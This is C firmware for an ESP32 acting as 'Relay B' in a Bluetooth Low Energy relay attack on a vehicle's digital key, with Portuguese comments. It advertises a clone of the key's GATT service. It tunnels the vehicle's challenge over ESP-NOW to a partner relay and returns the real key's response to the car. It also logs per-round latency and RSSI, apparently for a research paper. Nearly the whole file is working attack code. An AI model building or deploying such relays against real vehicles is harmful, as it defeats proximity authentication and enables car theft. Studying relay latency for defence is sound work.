/*
 * Relay B — peripheral BLE (perto do veiculo) + enlace ESP-NOW.
 *
 * Papel no ataque:
 *   - clona o servico da chave e anuncia, para o veiculo conectar nele;
 *   - quando o veiculo escreve o desafio, manda o nonce por ESP-NOW (LINK_MSG_CHALLENGE);
 *   - quando chega a resposta do Relay A (LINK_MSG_RESPONSE), notifica o veiculo.
 *
 * Duas metades:
 *   - SELFTEST (RELAY_LINK_SELFTEST 1): Milestone 1, sem BLE. O Relay B faz o papel de
 *     originador (como o veiculo faria): dispara um desafio periodico e mede o tempo de
 *     ida e volta pelo tunel A<->B (overhead do enlace, sem BLE).
 *   - BLE (RELAY_LINK_SELFTEST 0): Milestone 2. Servidor GATT NimBLE espelhando o
 *     KeyPeripheral.kt do app: servico SVC_UUID com CHALLENGE (write) e RESPONSE (notify).
 *
 * Contexto de execucao: o callback do ESP-NOW (on_link_rx) roda na task do WiFi e nao
 * pode fazer trabalho longo; por isso a resposta vinda do tunel e enfileirada e a chamada
 * GATT (notify) acontece na task 'notify_worker'. O caminho inverso (write do veiculo ->
 * tunel) roda na task do host NimBLE e chama link_send direto (esp_now_send nao bloqueia).
 */

#include "relay_b.h"
#include "relay_config.h"
#include "link.h"
#include "ble_contract.h"

#include <string.h>
#include "esp_log.h"
#include "esp_timer.h"

#include "cyd_display.h"
#include "cyd_led.h"
#include "cyd_ui.h"

static const char *TAG = "RELAY_B";

/* Cor de destaque do Relay B (ciano) e indices dos cards na UI. */
#define ACCENT 0x00B8D4
enum { F_VEIC = 0, F_TUNEL = 1, F_RTT = 2 };

/* Contadores mostrados no display (validos nos dois modos). */
static uint32_t s_from_vehicle;   /* desafios escritos pelo veiculo -> tunel */
static uint32_t s_from_tunnel;    /* respostas vindas do tunel -> notify ao veiculo */

/* Monta display + LED + UI. Chamado no inicio de relay_b_start (ambos os modos). */
static void relay_b_ui_init(void)
{
    cyd_display_init();
    cyd_led_init();
    cyd_display_set_backlight(90);
    cyd_ui_cfg_t cfg = {
        .title  = "RELAY B",
        .accent = ACCENT,
        .mascot = CYD_MASCOT_RELAY,
        .fields = { "Do veic", "Do tunel", "RTT us", NULL },
        .hex0   = "resp",
        .hex1   = NULL,
    };
    cyd_ui_init(&cfg);
    cyd_ui_set_field(F_VEIC, "0");
    cyd_ui_set_field(F_TUNEL, "0");
    cyd_ui_set_field(F_RTT, "-");
}

/* TODO(BLE) virou implementacao: chamado quando o veiculo escreve em CHALLENGE. */
static inline void forward_challenge(const uint8_t *nonce, size_t len)
{
    link_send(LINK_MSG_CHALLENGE, nonce, len);
}

#if RELAY_LINK_SELFTEST
/* -------- Milestone 1: autoteste do tunel, sem BLE ------------------------ */

static esp_timer_handle_t st_timer;
static uint32_t st_seq;
static int64_t  st_tx_us;

static void selftest_fire(void *arg)
{
    uint8_t nonce[NONCE_LEN] = {0};
    memcpy(nonce, &st_seq, sizeof st_seq);   /* nonce = contador, so para o teste */
    st_tx_us = esp_timer_get_time();
    link_send(LINK_MSG_CHALLENGE, nonce, NONCE_LEN);
    st_seq++;
    cyd_ui_set_field(F_VEIC, "%lu", (unsigned long) st_seq);
    esp_timer_start_once(st_timer, 1000000); /* 1 s */
}

#else
/* -------- Milestone 2: peripheral BLE (clone da chave) -------------------- */

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"

#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"
#include "host/ble_hs.h"
#include "host/ble_gatt.h"
#include "host/util/util.h"
#include "os/os_mbuf.h"
#include "services/gap/ble_svc_gap.h"
#include "services/gatt/ble_svc_gatt.h"

static uint8_t  own_addr_type;
static uint16_t g_conn = BLE_HS_CONN_HANDLE_NONE;
static uint16_t h_response_val;                 /* handle da RESPONSE, usado no notify */
static uint8_t  last_response[RESPONSE_LEN];     /* ultima resposta (p/ leitura READ) */

/* Medidas por rodada (paper): o Relay B ve o desafio do veiculo e a resposta voltando;
 * o turnaround local (rx_chal -> tx_resp) = tunel + lado da chave, visto por B. O nonce
 * (4 bytes) correlaciona a rodada com os logs do veiculo, do Relay A e da chave. */
static int64_t  s_t_chal_us;
static uint8_t  s_nonce4[4];
static uint32_t s_round;

/* Fila veiculo<-tunel: resposta a notificar, preenchida no callback ESP-NOW (task WiFi)
 * e consumida pela task notify_worker (que pode chamar a API GATT com seguranca). */
typedef struct { uint8_t data[RESPONSE_LEN]; uint8_t len; } notify_item_t;
static QueueHandle_t notify_q;

static int  gap_event(struct ble_gap_event *event, void *arg);
static void start_advertising(void);
static void host_task(void *param);

/* ---- servidor GATT (espelho do KeyPeripheral.kt) ------------------------ */

static int gatt_access(uint16_t conn_handle, uint16_t attr_handle,
                       struct ble_gatt_access_ctxt *ctxt, void *arg)
{
    switch (ctxt->op) {
    case BLE_GATT_ACCESS_OP_WRITE_CHR:
        if (ble_uuid_cmp(ctxt->chr->uuid, &CHR_CHALLENGE_UUID.u) == 0) {
            uint8_t nonce[NONCE_LEN];
            uint16_t olen = 0;
            int rc = ble_hs_mbuf_to_flat(ctxt->om, nonce, sizeof nonce, &olen);
            if (rc != 0) return BLE_ATT_ERR_UNLIKELY;
            s_t_chal_us = esp_timer_get_time();
            memcpy(s_nonce4, nonce, 4);
            s_round++;
            ESP_LOGI(TAG, "HOP B rx_chal rodada=%lu nonce=%02x%02x%02x%02x t=%lld us",
                     (unsigned long) s_round, nonce[0], nonce[1], nonce[2], nonce[3],
                     (long long) s_t_chal_us);
            ESP_LOGI(TAG, "desafio do veiculo (%u B) -> tunel", olen);
            forward_challenge(nonce, olen);
            s_from_vehicle++;
            cyd_ui_set_field(F_VEIC, "%lu", (unsigned long) s_from_vehicle);
            cyd_ui_pulse();
            return 0;
        }
        return BLE_ATT_ERR_WRITE_NOT_PERMITTED;

    case BLE_GATT_ACCESS_OP_READ_CHR:
        if (ble_uuid_cmp(ctxt->chr->uuid, &CHR_RESPONSE_UUID.u) == 0) {
            int rc = os_mbuf_append(ctxt->om, last_response, RESPONSE_LEN);
            return rc == 0 ? 0 : BLE_ATT_ERR_INSUFFICIENT_RES;
        }
        return BLE_ATT_ERR_READ_NOT_PERMITTED;

    default:
        return BLE_ATT_ERR_UNLIKELY;
    }
}

/* CHALLENGE: write / write-no-rsp. RESPONSE: read + notify (NimBLE cria o CCCD 0x2902). */
static const struct ble_gatt_chr_def gatt_chrs[] = {
    {
        .uuid      = &CHR_CHALLENGE_UUID.u,
        .access_cb = gatt_access,
        .flags     = BLE_GATT_CHR_F_WRITE | BLE_GATT_CHR_F_WRITE_NO_RSP,
    },
    {
        .uuid       = &CHR_RESPONSE_UUID.u,
        .access_cb  = gatt_access,
        .flags      = BLE_GATT_CHR_F_READ | BLE_GATT_CHR_F_NOTIFY,
        .val_handle = &h_response_val,
    },
    { 0 },
};

static const struct ble_gatt_svc_def gatt_svcs[] = {
    {
        .type            = BLE_GATT_SVC_TYPE_PRIMARY,
        .uuid            = &SVC_UUID.u,
        .characteristics = gatt_chrs,
    },
    { 0 },
};

/* ---- advertising -------------------------------------------------------- */

static void start_advertising(void)
{
    /* Anuncia o SVC_UUID de 128 bits para o veiculo achar o "clone" da chave. */
    struct ble_hs_adv_fields fields = {0};
    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
    fields.uuids128 = (ble_uuid128_t[]){ SVC_UUID };
    fields.num_uuids128 = 1;
    fields.uuids128_is_complete = 1;

    int rc = ble_gap_adv_set_fields(&fields);
    if (rc != 0) { ESP_LOGE(TAG, "adv_set_fields rc=%d", rc); return; }

    /* Nome vai na scan response para nao estourar os 31 bytes do pacote de adv. */
    const char *name = ble_svc_gap_device_name();
    struct ble_hs_adv_fields rsp = {0};
    rsp.name = (uint8_t *) name;
    rsp.name_len = strlen(name);
    rsp.name_is_complete = 1;
    ble_gap_adv_rsp_set_fields(&rsp);

    struct ble_gap_adv_params advp = {0};
    advp.conn_mode = BLE_GAP_CONN_MODE_UND;
    advp.disc_mode = BLE_GAP_DISC_MODE_GEN;
    rc = ble_gap_adv_start(own_addr_type, NULL, BLE_HS_FOREVER, &advp, gap_event, NULL);
    if (rc != 0) ESP_LOGE(TAG, "adv_start rc=%d", rc);
    else { ESP_LOGI(TAG, "anunciando o clone da chave; aguardando o veiculo");
           cyd_ui_set_state("anunciando clone", ACCENT); }
}

/* ---- eventos GAP -------------------------------------------------------- */

static int gap_event(struct ble_gap_event *event, void *arg)
{
    switch (event->type) {

    case BLE_GAP_EVENT_CONNECT:
        if (event->connect.status == 0) {
            g_conn = event->connect.conn_handle;
            ESP_LOGI(TAG, "veiculo conectado (handle %u)", g_conn);
            cyd_ui_set_state("veiculo conectado", 0x1AA260);
        } else {
            ESP_LOGE(TAG, "conexao falhou (status=%d); re-anuncio", event->connect.status);
            start_advertising();
        }
        break;

    case BLE_GAP_EVENT_DISCONNECT:
        ESP_LOGI(TAG, "veiculo desconectou (reason=%d); re-anuncio", event->disconnect.reason);
        g_conn = BLE_HS_CONN_HANDLE_NONE;
        cyd_ui_set_state("anunciando clone", ACCENT);
        start_advertising();
        break;

    case BLE_GAP_EVENT_SUBSCRIBE:
        ESP_LOGI(TAG, "veiculo %s notify na RESPONSE",
                 event->subscribe.cur_notify ? "habilitou" : "desabilitou");
        break;

    case BLE_GAP_EVENT_ADV_COMPLETE:
        start_advertising();
        break;

    default:
        break;
    }
    return 0;
}

/* ---- task worker: resposta do tunel -> notify ao veiculo ---------------- */

static void notify_worker(void *arg)
{
    notify_item_t it;
    for (;;) {
        if (xQueueReceive(notify_q, &it, portMAX_DELAY) != pdTRUE) continue;

        if (g_conn == BLE_HS_CONN_HANDLE_NONE) {
            ESP_LOGW(TAG, "resposta chegou sem veiculo conectado; descarto");
            continue;
        }
        memcpy(last_response, it.data, RESPONSE_LEN);

        struct os_mbuf *om = ble_hs_mbuf_from_flat(it.data, it.len);
        if (om == NULL) { ESP_LOGE(TAG, "sem mbuf para notify"); continue; }

        int rc = ble_gatts_notify_custom(g_conn, h_response_val, om);  /* consome o mbuf */
        if (rc != 0) ESP_LOGE(TAG, "notify rc=%d", rc);
        else ESP_LOGI(TAG, "resposta (%u B) notificada ao veiculo", it.len);

        /* Turnaround local de B (desafio recebido -> resposta notificada): tunel + lado
         * da chave. Uma linha CSVB parseavel por rodada, correlacionada pelo nonce. */
        int64_t turn = esp_timer_get_time() - s_t_chal_us;
        int8_t rssi = 0;
        ble_gap_conn_rssi(g_conn, &rssi);
        ESP_LOGI(TAG, "HOP B tx_resp rodada=%lu nonce=%02x%02x%02x%02x turnaround=%lld us rssi=%d dBm",
                 (unsigned long) s_round, s_nonce4[0], s_nonce4[1], s_nonce4[2], s_nonce4[3],
                 (long long) turn, rssi);
        ESP_LOGI(TAG, "CSVB,%lu,%02x%02x%02x%02x,%lld,%d",
                 (unsigned long) s_round, s_nonce4[0], s_nonce4[1], s_nonce4[2], s_nonce4[3],
                 (long long) turn, rssi);

        s_from_tunnel++;
        cyd_ui_set_field(F_TUNEL, "%lu", (unsigned long) s_from_tunnel);
        cyd_ui_set_hex(0, it.data, it.len);
        cyd_ui_pulse();
    }
}

/* ---- ciclo de vida do host ---------------------------------------------- */

static void on_sync(void)
{
    if (ble_hs_util_ensure_addr(0) != 0) { ESP_LOGE(TAG, "sem endereco BLE"); return; }
    if (ble_hs_id_infer_auto(0, &own_addr_type) != 0) { ESP_LOGE(TAG, "infer addr falhou"); return; }
    start_advertising();
}

static void on_reset(int reason) { ESP_LOGE(TAG, "BLE reset (reason=%d)", reason); }

static void host_task(void *param)
{
    nimble_port_run();
    nimble_port_freertos_deinit();
}

#endif /* RELAY_LINK_SELFTEST */

/* ------------------------------------------------------------------------- */
/* Recebe frames do Relay A. Roda no contexto da task do WiFi.               */
/* ------------------------------------------------------------------------- */
static void on_link_rx(link_msg_type_t type, const uint8_t *data, size_t len)
{
    switch (type) {
    case LINK_MSG_RESPONSE:
#if RELAY_LINK_SELFTEST
    {
        int64_t rtt = esp_timer_get_time() - st_tx_us;
        ESP_LOGI(TAG, "[selfteste] resposta recebida (%d B); RTT tunel=%lld us",
                 (int) len, (long long) rtt);
        s_from_tunnel++;
        cyd_ui_set_field(F_TUNEL, "%lu", (unsigned long) s_from_tunnel);
        cyd_ui_set_field(F_RTT, "%lld", (long long) rtt);
        cyd_ui_set_hex(0, data, (int) len);
        cyd_ui_pulse();
    }
#else
    {
        /* Enfileira para a task worker notificar o veiculo (nao fazer GATT aqui). */
        notify_item_t it;
        it.len = (len > RESPONSE_LEN) ? RESPONSE_LEN : (uint8_t) len;
        memcpy(it.data, data, it.len);
        if (xQueueSend(notify_q, &it, 0) != pdTRUE)
            ESP_LOGW(TAG, "fila de notify cheia; descarto resposta");
    }
#endif
        break;
    default:
        break;
    }
}

void relay_b_start(void)
{
    relay_b_ui_init();
#if RELAY_LINK_SELFTEST
    cyd_ui_set_state("selfteste do tunel", ACCENT);
    ESP_ERROR_CHECK(link_init(on_link_rx));
    const esp_timer_create_args_t ta = { .callback = selftest_fire, .name = "selftest" };
    ESP_ERROR_CHECK(esp_timer_create(&ta, &st_timer));
    esp_timer_start_once(st_timer, 1000000);
    ESP_LOGI(TAG, "Relay B iniciado (autoteste do tunel; originando desafios a cada 1 s)");
#else
    /* Cria a fila e a task worker ANTES de link_init (que registra o callback do ESP-NOW),
     * para que nenhum frame caia em on_link_rx com a fila ainda nula. */
    notify_q = xQueueCreate(4, sizeof(notify_item_t));
    if (notify_q == NULL) { ESP_LOGE(TAG, "sem fila de notify"); return; }
    xTaskCreate(notify_worker, "notify_wk", 4096, NULL, 10, NULL);

    ESP_ERROR_CHECK(link_init(on_link_rx));

    esp_err_t ret = nimble_port_init();
    if (ret != ESP_OK) { ESP_LOGE(TAG, "nimble_port_init rc=%d", ret); return; }

    ble_hs_cfg.reset_cb = on_reset;
    ble_hs_cfg.sync_cb  = on_sync;

    ble_svc_gap_init();
    ble_svc_gatt_init();
    ble_svc_gap_device_name_set("relay-b");

    int rc = ble_gatts_count_cfg(gatt_svcs);
    if (rc != 0) { ESP_LOGE(TAG, "gatts_count_cfg rc=%d", rc); return; }
    rc = ble_gatts_add_svcs(gatt_svcs);
    if (rc != 0) { ESP_LOGE(TAG, "gatts_add_svcs rc=%d", rc); return; }

    nimble_port_freertos_init(host_task);
    ESP_LOGI(TAG, "Relay B iniciado (BLE peripheral: clone da chave)");
#endif
}
